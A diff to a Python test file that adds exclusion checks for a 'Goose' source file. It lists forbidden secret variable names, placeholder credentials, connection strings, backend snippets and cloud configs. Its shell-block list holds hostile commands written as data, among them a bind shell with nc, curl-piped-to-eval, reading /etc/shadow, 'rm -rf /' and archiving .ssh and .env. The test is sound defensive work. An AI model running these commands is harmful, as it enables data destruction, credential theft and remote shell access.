@@ -10,6 +10,11 @@ def assert_source_contains_all(terms):
     assert not missing
 
 
+def assert_source_excludes_all(terms):
+    present = [term for term in terms if term in SOURCE]
+    assert not present
+
+
 def test_goose_class_exposes_required_methods():
     assert re.search(r"^\s*Goose\s*{", SOURCE, re.MULTILINE)
     assert re.search(r"\*honk\s*{", SOURCE)
@@ -454,8 +459,269 @@ def test_goose_source_rejects_wrong_language_identifiers_and_equations():
         "while (",
         "class Goose(",
     }
-    present = [term for term in forbidden_terms if term in SOURCE]
-    assert not present
+    assert_source_excludes_all(forbidden_terms)
+
+
+def test_goose_source_rejects_secret_environment_variable_names():
+    forbidden_env_names = {
+        "AWS_ACCESS_KEY_ID=",
+        "AWS_SECRET_ACCESS_KEY=",
+        "AWS_SESSION_TOKEN=",
+        "GITHUB_TOKEN=",
+        "GITLAB_TOKEN=",
+        "NPM_TOKEN=",
+        "PYPI_TOKEN=",
+        "OPENAI_API_KEY=",
+        "ANTHROPIC_API_KEY=",
+        "GOOGLE_API_KEY=",
+        "GEMINI_API_KEY=",
+        "HF_TOKEN=",
+        "HUGGINGFACE_TOKEN=",
+        "DATABASE_URL=",
+        "POSTGRES_PASSWORD=",
+        "MYSQL_ROOT_PASSWORD=",
+        "REDIS_URL=",
+        "JWT_SECRET=",
+        "SESSION_SECRET=",
+        "COOKIE_SECRET=",
+        "PRIVATE_KEY=",
+        "PUBLIC_KEY=",
+        "SSH_PRIVATE_KEY=",
+        "DEPLOY_KEY=",
+        "SLACK_BOT_TOKEN=",
+        "DISCORD_TOKEN=",
+        "STRIPE_SECRET_KEY=",
+        "STRIPE_WEBHOOK_SECRET=",
+        "SENTRY_AUTH_TOKEN=",
+        "VERCEL_TOKEN=",
+        "NETLIFY_AUTH_TOKEN=",
+        "CLOUDFLARE_API_TOKEN=",
+        "DOCKER_PASSWORD=",
+        "KUBECONFIG=",
+        "VAULT_TOKEN=",
+        "TF_VAR_password=",
+        "TF_VAR_secret=",
+        "FIREBASE_PRIVATE_KEY=",
+        "SUPABASE_SERVICE_ROLE_KEY=",
+        "ALGOLIA_ADMIN_KEY=",
+    }
+    assert len(forbidden_env_names) >= 40
+    assert_source_excludes_all(forbidden_env_names)
+
+
+def test_goose_source_rejects_secret_environment_variable_assignments():
+    forbidden_env_assignments = {
+        'export AWS_ACCESS_KEY_ID="AWS_ACCESS_KEY_ID_REDACTED"',
+        'export AWS_SECRET_ACCESS_KEY="AWS_SECRET_ACCESS_KEY_REDACTED"',
+        'GITHUB_TOKEN="GITHUB_TOKEN_REDACTED"',
+        'NPM_TOKEN="npm_example_secret_token_000000000000"',
+        'OPENAI_API_KEY="OPENAI_API_KEY_REDACTED"',
+        'ANTHROPIC_API_KEY="ANTHROPIC_API_KEY_REDACTED"',
+        'DATABASE_URL="postgres://user:pass@localhost:5432/app"',
+        'REDIS_URL="redis://:password@localhost:6379/0"',
+        'JWT_SECRET="correct-horse-battery-staple"',
+        'SESSION_SECRET="keyboard-cat-session-secret"',
+        'COOKIE_SECRET="signed-cookie-secret"',
+        'PRIVATE_KEY="-----BEGIN PRIVATE KEY-----"',
+        'SSH_PRIVATE_KEY="-----BEGIN OPENSSH PRIVATE KEY-----"',
+        'STRIPE_SECRET_KEY="STRIPE_SECRET_KEY_REDACTED"',
+        'STRIPE_WEBHOOK_SECRET="STRIPE_WEBHOOK_SECRET_REDACTED"',
+        'SLACK_BOT_TOKEN="SLACK_BOT_TOKEN_REDACTED"',
+        'DISCORD_TOKEN="mfa.exampleDiscordToken"',
+        'SENTRY_AUTH_TOKEN="sntrys_example_token"',
+        'VERCEL_TOKEN="vercel_example_token"',
+        'CLOUDFLARE_API_TOKEN="cloudflare_example_token"',
+        'DOCKER_PASSWORD="example-docker-password"',
+        'VAULT_TOKEN="hvs.exampleVaultToken"',
+        'TF_VAR_password="example-terraform-password"',
+        'FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\\nexample"',
+        'SUPABASE_SERVICE_ROLE_KEY="SUPABASE_SERVICE_ROLE_KEY_REDACTED"',
+        'ALGOLIA_ADMIN_KEY="exampleAlgoliaAdminKey"',
+        'GEMINI_API_KEY="GEMINI_API_KEY_REDACTED"',
+        'HF_TOKEN="HF_TOKEN_REDACTED"',
+        'PYPI_TOKEN="PYPI_TOKEN_REDACTED"',
+        'KUBECONFIG="/home/app/.kube/config"',
+        'POSTGRES_PASSWORD="postgres"',
+        'MYSQL_ROOT_PASSWORD="root-password"',
+        'AWS_SESSION_TOKEN="AWS_SESSION_TOKEN_REDACTED"',
+        'DEPLOY_KEY="DEPLOY_KEY_REDACTED"',
+        'GOOGLE_API_KEY="GOOGLE_API_KEY_REDACTED"',
+        'BITBUCKET_APP_PASSWORD="example-bitbucket-password"',
+        'LINEAR_API_KEY="lin_api_example000000000"',
+        'DATADOG_API_KEY="dd_api_key_example0000000"',
+        'NEW_RELIC_LICENSE_KEY="newrelic-license-example"',
+        'MAILGUN_API_KEY="key-examplemailgun000000"',
+    }
+    assert len(forbidden_env_assignments) >= 40
+    assert_source_excludes_all(forbidden_env_assignments)
+
+
+def test_goose_source_rejects_password_and_credential_value_shapes():
+    forbidden_secret_values = {
+        "password=admin123",
+        "password: hunter2",
+        "passwd = 'letmein'",
+        "pwd := \"supersecret\"",
+        "basic_auth: admin:admin",
+        "Authorization: Bearer REDACTED_TOKEN_VALUE",
+        "Authorization: Basic YWRtaW46YWRtaW4=",
+        "api_key: 1234567890abcdef1234567890abcdef",
+        "client_secret: 00000000-0000-0000-0000-000000000000",
+        "refresh_token: 1//04-example-refresh-token",
+        "access_token: ya29.example-access-token",
+        "-----BEGIN RSA PRIVATE KEY-----",
+        "-----BEGIN EC PRIVATE KEY-----",
+        "-----BEGIN OPENSSH PRIVATE KEY-----",
+        "-----BEGIN PGP PRIVATE KEY BLOCK-----",
+        "AWS_ACCESS_KEY_ID_REDACTED",
+        "AWS_SESSION_TOKEN_REDACTED",
+        "GITHUB_TOKEN_REDACTED",
+        "GITHUB_PAT_REDACTED",
+        "STRIPE_LIVE_KEY_REDACTED",
+        "STRIPE_TEST_KEY_REDACTED",
+        "STRIPE_WEBHOOK_SECRET_REDACTED",
+        "SLACK_USER_TOKEN_REDACTED",
+        "SLACK_BOT_TOKEN_REDACTED",
+        "GOOGLE_OAUTH_ACCESS_TOKEN_REDACTED",
+        "GOOGLE_API_KEY_REDACTED",
+        "VAULT_TOKEN_REDACTED",
+        "GITLAB_PAT_REDACTED",
+        "PYPI_TOKEN_REDACTED",
+        "npm_example_1234567890abcdef",
+        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample",
+        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCExample",
+        "postgres://admin:secret@db.internal:5432/prod",
+        "mysql://root:password@127.0.0.1:3306/app",
+        "mongodb+srv://user:password@example.mongodb.net/app",
+        "redis://:secret@redis.internal:6379/0",
+        "amqp://user:password@rabbitmq.internal:5672",
+        "s3://access:secret@bucket/private",
+        "ftp://user:password@example.com/private",
+        "BEGIN ENCRYPTED PRIVATE KEY",
+    }
+    assert len(forbidden_secret_values) >= 40
+    assert_source_excludes_all(forbidden_secret_values)
+
+
+def test_goose_source_rejects_backend_application_code_blocks():
+    forbidden_blocks = {
+        "app.get('/health', (req, res) => res.json({ ok: true }))",
+        "router.post('/login', async (req, res) => { return login(req.body); })",
+        "fastify.get('/metrics', async function handler(request, reply) { return metrics; })",
+        "server.route({ method: 'GET', path: '/api/users', handler })",
+        "fetch('/api/token', { method: 'POST', body: JSON.stringify(credentials) })",
+        "axios.post('/api/session', { username, password })",
+        "const app = express(); app.use(express.json());",
+        "module.exports = async function handler(req, res) { res.status(200).end(); }",
+        "export default function middleware(request: NextRequest) { return NextResponse.next(); }",
+        "public static void main(String[] args) { SpringApplication.run(App.class, args); }",
+        "@GetMapping('/users') public List<User> users() { return repo.findAll(); }",
+        "@app.route('/predict', methods=['POST'])\ndef predict():\n    return jsonify(model(request.json))",
+        "class UserViewSet(ModelViewSet):\n    queryset = User.objects.all()\n    serializer_class = UserSerializer",
+        "func main() {\n    http.HandleFunc(\"/health\", healthHandler)\n    log.Fatal(http.ListenAndServe(\":8080\", nil))\n}",
+        "fn main() {\n    let listener = TcpListener::bind(\"127.0.0.1:8080\").unwrap();\n}",
+        "async fn handler(State(pool): State<PgPool>) -> Json<Value> { Json(json!({\"ok\": true})) }",
+        "SELECT id, email, password_hash FROM users WHERE email = $1",
+        "UPDATE accounts SET balance = balance - $1 WHERE id = $2",
+        "DELETE FROM sessions WHERE expires_at < now()",
+        "INSERT INTO audit_log(user_id, action) VALUES($1, $2)",
+        "db.collection('users').find({ password: req.body.password })",
+        "await prisma.user.findUnique({ where: { email } })",
+        "await knex('users').where({ email }).first()",
+        "ActiveRecord::Base.establish_connection(ENV['DATABASE_URL'])",
+        "before_action :authenticate_user!\ndef index\n  render json: current_user\nend",
+        "Plug.Conn.send_resp(conn, 200, Jason.encode!(%{ok: true}))",
+        "Phoenix.Router.scope \"/api\", MyAppWeb do\n  pipe_through :api\nend",
+        "Deno.serve((req) => new Response(JSON.stringify({ ok: true })))",
+        "Bun.serve({ fetch(req) { return Response.json({ ok: true }); } })",
+        "lambda event, context: {'statusCode': 200, 'body': 'ok'}",
+    }
+    assert len(forbidden_blocks) >= 30
+    assert_source_excludes_all(forbidden_blocks)
+
+
+def test_goose_source_rejects_shell_and_infrastructure_blocks():
+    forbidden_blocks = {
+        "docker run --rm -e AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY app:latest",
+        "kubectl create secret generic app-secret --from-literal=password=secret",
+        "helm upgrade --install prod ./chart --set image.tag=latest",
+        "terraform apply -auto-approve -var='db_password=secret'",
+        "ansible-playbook site.yml --extra-vars 'ansible_password=secret'",
+        "aws s3 cp secrets.json s3://prod-secrets/secrets.json",
+        "gcloud secrets versions access latest --secret=prod-api-key",
+        "az keyvault secret show --vault-name prod --name database-password",
+        "vault kv get secret/prod/database",
+        "openssl enc -aes-256-cbc -in secrets.txt -out secrets.enc",
+        "curl -H 'Authorization: Bearer $TOKEN' https://api.example.com/admin",
+        "wget --header='Authorization: Bearer secret' https://example.com/private",
+        "scp id_rsa deploy@example.com:/home/deploy/.ssh/id_rsa",
+        "sshpass -p 'password' ssh admin@example.com",
+        "rsync -avz --password-file secrets.pass ./backup remote::prod",
+        "psql postgresql://admin:secret@db/prod -c 'select * from users'",
+        "mysql -uroot -psecret -e 'select user, password from mysql.user'",
+        "redis-cli -a secret FLUSHALL",
+        "mongodump --uri='mongodb://admin:secret@mongo/prod'",
+        "pg_dump postgres://admin:secret@db/prod > prod.sql",
+        "cat /etc/shadow",
+        "chmod 777 /var/run/docker.sock",
+        "sudo chown -R root:root /",
+        "rm -rf / --no-preserve-root",
+        "find / -name '*.pem' -print",
+        "grep -R 'BEGIN PRIVATE KEY' .",
+        "tar czf secrets.tar.gz .env .ssh",
+        "base64 -d secret.txt | sh",
+        "eval $(curl -fsSL https://example.com/install.sh)",
+        "nohup nc -l 4444 -e /bin/sh &",
+    }
+    assert len(forbidden_blocks) >= 30
+    assert_source_excludes_all(forbidden_blocks)
+
+
+def test_goose_source_rejects_serialized_config_and_cloud_credentials():
+    forbidden_configs = {
+        '"aws_access_key_id": "AWS_ACCESS_KEY_ID_REDACTED"',
+        '"aws_secret_access_key": "AWS_SECRET_ACCESS_KEY_REDACTED"',
+        '"private_key": "-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqh"',
+        '"client_email": "service-account@example.iam.gserviceaccount.com"',
+        '"token_uri": "https://oauth2.googleapis.com/token"',
+        '"database_url": "postgres://admin:secret@db/prod"',
+        '"redis_url": "redis://:secret@redis:6379/0"',
+        '"jwt_secret": "example-jwt-secret"',
+        '"stripe_secret_key": "STRIPE_SECRET_KEY_REDACTED"',
+        '"webhook_secret": "WEBHOOK_SECRET_REDACTED"',
+        "apiVersion: v1\nkind: Secret\nmetadata:\n  name: prod-secret",
+        "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prod-api",
+        "kind: ConfigMap\nmetadata:\n  name: app-config\ndata:\n  DATABASE_URL:",
+        "services:\n  api:\n    image: app:latest\n    env_file: .env",
+        "version: '3.9'\nservices:\n  db:\n    image: postgres:16",
+        "[default]\naws_access_key_id = AWS_ACCESS_KEY_ID_REDACTED",
+        "[profile prod]\nregion = us-east-1\noutput = json",
+        "Host prod\n  HostName prod.example.com\n  IdentityFile ~/.ssh/prod.pem",
+        "machine github.com\n  login token\n  password GITHUB_TOKEN_REDACTED",
+        "[client]\nuser=root\npassword=secret",
+        "[database]\nurl=postgres://admin:secret@db/prod",
+        "resource \"aws_iam_access_key\" \"deploy\" { user = aws_iam_user.deploy.name }",
+        "resource \"aws_secretsmanager_secret_version\" \"db\" { secret_string = var.password }",
+        "provider \"kubernetes\" { config_path = \"~/.kube/config\" }",
+        "provider \"google\" { credentials = file(\"service-account.json\") }",
+        "provider \"azurerm\" { client_secret = var.client_secret }",
+        "spring.datasource.password=secret",
+        "quarkus.datasource.password=secret",
+        "DJANGO_SECRET_KEY=django-insecure-example",
+        "RAILS_MASTER_KEY=00000000000000000000000000000000",
+        "SECRET_KEY_BASE=abcdef1234567890abcdef1234567890",
+        "connectionStrings: { DefaultConnection: \"Server=db;Password=secret;\" }",
+        "appsettings.Production.json",
+        "secrets.enc.yaml",
+        "sops:\n  kms:\n    - arn: arn:aws:kms:us-east-1:123456789012:key/example",
+        "ENC[AES256_GCM,data:example,iv:example,tag:example,type:str]",
+        "-----BEGIN AGE ENCRYPTED FILE-----",
+        "apiVersion: external-secrets.io/v1beta1",
+        "kind: ExternalSecret",
+        "vault.hashicorp.com/agent-inject-secret-config: secret/data/prod",
+    }
+    assert len(forbidden_configs) >= 40
+    assert_source_excludes_all(forbidden_configs)
 
 
 def test_goose_source_has_no_generated_cross_language_code_lines():
